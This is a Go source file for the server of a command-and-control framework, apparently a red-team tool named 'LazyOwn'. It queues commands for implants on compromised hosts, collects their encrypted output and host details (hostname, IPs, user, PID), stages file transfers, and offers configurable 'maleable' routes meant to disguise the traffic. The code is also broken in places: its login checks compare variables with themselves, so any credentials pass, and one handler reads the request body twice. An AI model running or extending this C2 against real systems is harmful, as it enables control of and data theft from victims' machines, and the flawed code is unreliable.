package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/csv"
	"encoding/json"
	"encoding/base64"
	"errors"
	"fmt"
	"html/template"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
)

var (
	connectedClients   sync.Map
	commands           sync.Map
	results            sync.Map
	commandsHistory    sync.Map
	routeMaleable      = "{maleable}"
	allowedDirectory   = "sessions"
	toolsDir           = "tools"
	username           = "{username}"
	password           = "{password}"
	config             = map[string]string{"key": "value"}
	currentUser        = User{ID: 1, Elo: 1500, IsAuthenticated: true}
	karmaName          = "KarmaName"
	prompt             = "Prompt"
	eventConfig        = map[string]string{"event": "config"}
	responseBot        = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
	tasks              = []Task{}
	implants           = []string{"implant1", "implant2"}
	encryptionKey      []byte
)

type User struct {
	ID              int
	Elo             int
	IsAuthenticated bool
}

type Task struct {
	ID          int
	Title       string
	Description string
	Operator    string
	Status      string
}

func init() {
	keyPath := filepath.Join("sessions", "key.aes")
	keyData, err := ioutil.ReadFile(keyPath)
	if err != nil {
		panic(fmt.Sprintf("Failed to read AES key: %v", err))
	}
	if len(keyData) != 32 {
		panic("AES key must be 32 bytes")
	}
	encryptionKey = keyData
}

func main() {
	createDirectories()
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/command/", commandHandler)
	http.HandleFunc(routeMaleable, commandHandler)
	http.HandleFunc("/issue_command", issueCommandHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc(routeMaleable+"upload", uploadHandler)
	http.HandleFunc("/download_file", downloadFileHandler)
	http.HandleFunc(routeMaleable+"download_file", downloadFileHandler)
	http.HandleFunc("/download/", serveFileHandler)
	http.HandleFunc(routeMaleable+"download/", serveFileHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/logout", logoutHandler)

	log.Println("Server starting on :{lport}")
	log.Fatal(http.ListenAndServe(":{lport}", nil))
}
// Encrypt cifra un texto plano usando AES-CFB.
func Encrypt(plainText string, key []byte) (string, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }
    plaintext := []byte(plainText)
    ciphertext := make([]byte, aes.BlockSize+len(plaintext))
    iv := ciphertext[:aes.BlockSize]
    if _, err := rand.Read(iv); err != nil {
        return "", err
    }
    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Decrypt descifra un texto cifrado usando AES-CFB.
func Decrypt(cipherText string, key []byte) (string, error) {
    ciphertext, err := base64.StdEncoding.DecodeString(cipherText)
    if err != nil {
        return "", err
    }
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }
    if len(ciphertext) < aes.BlockSize {
        return "", fmt.Errorf("ciphertext too short")
    }
    iv := ciphertext[:aes.BlockSize]
    ciphertext = ciphertext[aes.BlockSize:]
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(ciphertext, ciphertext)
    return string(ciphertext), nil
}
func createDirectories() {
	dirs := []string{
		filepath.Join(allowedDirectory, "uploads"),
		filepath.Join(allowedDirectory, "temp_uploads"),
	}

	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatalf("Failed to create directory %s: %v", dir, err)
		}
	}
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	if !checkAuth(w, r) {
		return
	}

	sessionData, err := getLatestSessionData()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	connectedClientsList := getConnectedClients()
	tools := loadTools()
	clientData := getClientData(connectedClientsList)

	data := map[string]interface{}{
		"connectedClients": connectedClientsList,
		"results":          syncMapToMap(&results),
		"sessionData":      sessionData,
		"commandsHistory":  syncMapToMap(&commandsHistory),
		"osData":           clientData.os,
		"pid":              clientData.pid,
		"hostname":         clientData.hostname,
		"ips":              clientData.ips,
		"user":             clientData.user,
		"username":         username,
		"password":         password,
		"c2Route":          routeMaleable,
		"implants":         implants,
		"directories":      getDirectories(),
		"tasks":            tasks,
		"bot":              responseBot,
		"eventConfig":      eventConfig,
		"config":           config,
		"tools":            tools,
		"currentUser":      currentUser,
		"karmaName":        karmaName,
		"currentUserID":    currentUser.ID,
		"elo":              currentUser.Elo,
		"prompt":           prompt,
	}

	renderTemplate(w, "index.html", data)
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := extractClientID(r.URL.Path)
	if r.Method == http.MethodGet {
		handleGetCommand(w, clientID)
	} else if r.Method == http.MethodPost {
		handlePostResult(w, r, clientID)
	}
}

func handleGetCommand(w http.ResponseWriter, clientID string) {
    command := "whoami" // Ejemplo de comando
    key := []byte(os.Getenv("AES_KEY"))
    encryptedCommand, err := Encrypt(command, key)
    if err != nil {
        http.Error(w, "Encryption failed", http.StatusInternalServerError)
        return
    }
    w.Write([]byte(encryptedCommand))
}

func handlePostResult(w http.ResponseWriter, r *http.Request, clientID string) {
	data, err := decryptRequest(r)
	body, err := io.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read request body", http.StatusBadRequest)
        return
    }
    key := []byte(os.Getenv("AES_KEY"))
    decryptedResult, err := Decrypt(string(body), key)
    if err != nil {
        http.Error(w, "Decryption failed", http.StatusInternalServerError)
        return
    }
    fmt.Println("Received result:", decryptedResult)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if err := validateData(data); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if err := saveClientData(clientID, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	connectedClients.Store(clientID, true)
	w.WriteHeader(http.StatusOK)
}

func issueCommandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.FormValue("client_id")
	command := r.FormValue("command")
	storeCommand(clientID, command)
	http.Redirect(w, r, "/", http.StatusFound)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		handleFileUpload(w, r)
		return
	}
	serveUploadForm(w)
}

func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.FormValue("client_id")
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Invalid file upload", http.StatusBadRequest)
		return
	}
	defer file.Close()

	saveTempFile(clientID, header.Filename, file)
	http.Redirect(w, r, "/", http.StatusFound)
}

func serveFileHandler(w http.ResponseWriter, r *http.Request) {
	filePath := extractFilePath(r.URL.Path)
	fullPath := filepath.Join(allowedDirectory, "temp_uploads", filePath)

	fileData, err := ioutil.ReadFile(fullPath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	sendEncryptedFile(w, fileData, filePath)
}

// Security functions
func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	username, password, ok := r.BasicAuth()
	if !ok || username != username || password != password {
		w.Header().Set("WWW-Authenticate", `Basic realm="Restricted"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

func validateClientID(clientID string) bool {
	return regexp.MustCompile(`^[a-zA-Z0-9_-]+$`).MatchString(clientID)
}

func secureFilename(filename string) string {
	return regexp.MustCompile(`[^a-zA-Z0-9_.-]`).ReplaceAllString(filename, "_")
}

// Encryption functions
func encryptData(data []byte) []byte {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		panic(err.Error())
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		panic(err.Error())
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	ciphertext := make([]byte, len(data))
	stream.XORKeyStream(ciphertext, data)

	return append(iv, ciphertext...)
}

func decryptData(encryptedData []byte) []byte {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		panic(err.Error())
	}

	if len(encryptedData) < aes.BlockSize {
		panic("ciphertext too short")
	}

	iv := encryptedData[:aes.BlockSize]
	ciphertext := encryptedData[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	stream.XORKeyStream(plaintext, ciphertext)

	return plaintext
}

// Helper functions
func extractClientID(path string) string {
	return strings.TrimPrefix(path, "/command/")
}

func extractFilePath(path string) string {
	return strings.TrimPrefix(path, "/download/")
}

func getLatestSessionData() (map[string]interface{}, error) {
	sessionsDir := filepath.Join(allowedDirectory)
	files, err := ioutil.ReadDir(sessionsDir)
	if err != nil {
		return nil, fmt.Errorf("error reading sessions directory: %v", err)
	}

	var jsonFiles []os.FileInfo
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".json") {
			jsonFiles = append(jsonFiles, file)
		}
	}

	if len(jsonFiles) == 0 {
		return nil, errors.New("no JSON files found in sessions directory")
	}

	sort.Slice(jsonFiles, func(i, j int) bool {
		return jsonFiles[i].ModTime().After(jsonFiles[j].ModTime())
	})

	latestFile := filepath.Join(sessionsDir, jsonFiles[0].Name())
	data, err := ioutil.ReadFile(latestFile)
	if err != nil {
		return nil, fmt.Errorf("error reading JSON file: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, fmt.Errorf("error parsing JSON: %v", err)
	}

	return result, nil
}

type clientData struct {
	os       map[string]string
	pid      map[string]string
	hostname map[string]string
	ips      map[string]string
	user     map[string]string
}

func getClientData(clients []string) clientData {
	data := clientData{
		os:       make(map[string]string),
		pid:      make(map[string]string),
		hostname: make(map[string]string),
		ips:      make(map[string]string),
		user:     make(map[string]string),
	}

	for _, client := range clients {
		csvFile := filepath.Join(allowedDirectory, client+".log")
		file, err := os.Open(csvFile)
		if err != nil {
			continue
		}
		defer file.Close()

		reader := csv.NewReader(file)
		records, err := reader.ReadAll()
		if err != nil || len(records) == 0 {
			continue
		}

		last := records[len(records)-1]
		if len(last) >= 8 {
			data.os[client] = last[1]
			data.pid[client] = last[2]
			data.hostname[client] = last[3]
			data.ips[client] = last[4]
			data.user[client] = last[5]
		}
	}

	return data
}

func getTools(dir string) []map[string]interface{} {
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Printf("Error reading tools directory: %v\n", err)
		return nil
	}

	var tools []map[string]interface{}
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".tool") {
			toolPath := filepath.Join(dir, file.Name())
			data, err := ioutil.ReadFile(toolPath)
			if err != nil {
				log.Printf("Error reading tool file: %v\n", err)
				continue
			}

			var toolData map[string]interface{}
			if err := json.Unmarshal(data, &toolData); err != nil {
				log.Printf("Error unmarshalling tool data: %v\n", err)
				continue
			}

			toolData["filename"] = file.Name()
			tools = append(tools, toolData)
		}
	}
	return tools
}

func renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {
	t, err := template.ParseFiles(tmpl)
	if err != nil {
		http.Error(w, "Error parsing template", http.StatusInternalServerError)
		return
	}
	t.Execute(w, data)
}

func getConnectedClients() []string {
	var clients []string
	connectedClients.Range(func(key, value interface{}) bool {
		clients = append(clients, key.(string))
		return true
	})
	return clients
}

func loadTools() []map[string]interface{} {
	return getTools(toolsDir)
}

func syncMapToMap(syncMap *sync.Map) map[string]interface{} {
	result := make(map[string]interface{})
	syncMap.Range(func(key, value interface{}) bool {
		result[key.(string)] = value
		return true
	})
	return result
}

func getDirectories() []string {
	files, err := ioutil.ReadDir(allowedDirectory)
	if err != nil {
		log.Printf("Error reading allowed directory: %v\n", err)
		return nil
	}

	var dirs []string
	for _, file := range files {
		if file.IsDir() {
			dirs = append(dirs, file.Name())
		}
	}
	return dirs
}

func popCommand(clientID string) (string, bool) {
	if val, ok := commands.LoadAndDelete(clientID); ok {
		return val.(string), true
	}
	return "", false
}

func sendEncryptedResponse(w http.ResponseWriter, command string) {
	encryptedCommand := encryptData([]byte(command))
	w.Write(encryptedCommand)
}

func sendEmptyResponse(w http.ResponseWriter) {
	w.WriteHeader(http.StatusNoContent)
}

func decryptRequest(r *http.Request) ([]byte, error) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return nil, err
	}
	return decryptData(body), nil
}

func validateData(data []byte) error {
	var result map[string]string
	if err := json.Unmarshal(data, &result); err != nil {
		return fmt.Errorf("invalid data format: %v", err)
	}

	requiredFields := []string{"output", "command", "client", "pid", "hostname", "ips", "user"}
	for _, field := range requiredFields {
		if _, ok := result[field]; !ok {
			return fmt.Errorf("missing required field: %s", field)
		}
	}

	return nil
}

func saveClientData(clientID string, data []byte) error {
	var result map[string]string
	if err := json.Unmarshal(data, &result); err != nil {
		return fmt.Errorf("invalid data format: %v", err)
	}

	csvFile := filepath.Join(allowedDirectory, clientID+".log")
	return writeCSV(csvFile, result)
}

func storeCommand(clientID, command string) {
	commands.Store(clientID, command)
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Invalid file upload", http.StatusBadRequest)
		return
	}
	defer file.Close()

	filename := secureFilename(header.Filename)
	uploadDir := filepath.Join(allowedDirectory, "uploads")
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		http.Error(w, "Failed to create upload directory", http.StatusInternalServerError)
		return
	}

	filePath := filepath.Join(uploadDir, filename)
	dst, err := os.Create(filePath)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}

func serveUploadForm(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(`
		<!doctype html>
		<title>Upload File</title>
		<h1>Upload a File</h1>
		<form method="POST" enctype="multipart/form-data">
			<input type="file" name="file">
			<input type="submit" value="Upload">
		</form>
	`))
}

func saveTempFile(clientID, filename string, file io.Reader) {
	tempDir := filepath.Join(allowedDirectory, "temp_uploads")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		log.Printf("Failed to create temp directory: %v\n", err)
		return
	}

	filePath := filepath.Join(tempDir, filename)
	dst, err := os.Create(filePath)
	if err != nil {
		log.Printf("Failed to save temp file: %v\n", err)
		return
	}
	defer dst.Close()

	if _, err := io.Copy(dst, file); err != nil {
		log.Printf("Failed to save temp file: %v\n", err)
		return
	}
}

func sendEncryptedFile(w http.ResponseWriter, fileData []byte, filePath string) {
	encryptedFileData := encryptData(fileData)
	w.Write(encryptedFileData)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		username := r.FormValue("username")
		password := r.FormValue("password")
		if username == username && password == password {
			currentUser.IsAuthenticated = true
			http.Redirect(w, r, "/", http.StatusFound)
		} else {
			http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		}
	} else {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`
			<!doctype html>
			<title>Login</title>
			<h1>Login</h1>
			<form method="POST">
				<label for="username">Username:</label>
				<input type="text" id="username" name="username" required>
				<label for="password">Password:</label>
				<input type="password" id="password" name="password" required>
				<input type="submit" value="Login">
			</form>
		`))
	}
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	currentUser.IsAuthenticated = false
	http.Redirect(w, r, "/login", http.StatusFound)
}

func writeCSV(file string, data map[string]string) error {
	f, err := os.OpenFile(file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	writer := csv.NewWriter(f)
	defer writer.Flush()

	if info, err := f.Stat(); err == nil && info.Size() == 0 {
		writer.Write([]string{"client_id", "os", "pid", "hostname", "ips", "user", "command", "output"})
	}

	row := []string{
		data["client_id"],
		data["os"],
		data["pid"],
		data["hostname"],
		data["ips"],
		data["user"],
		data["command"],
		data["output"],
	}
	return writer.Write(row)
}
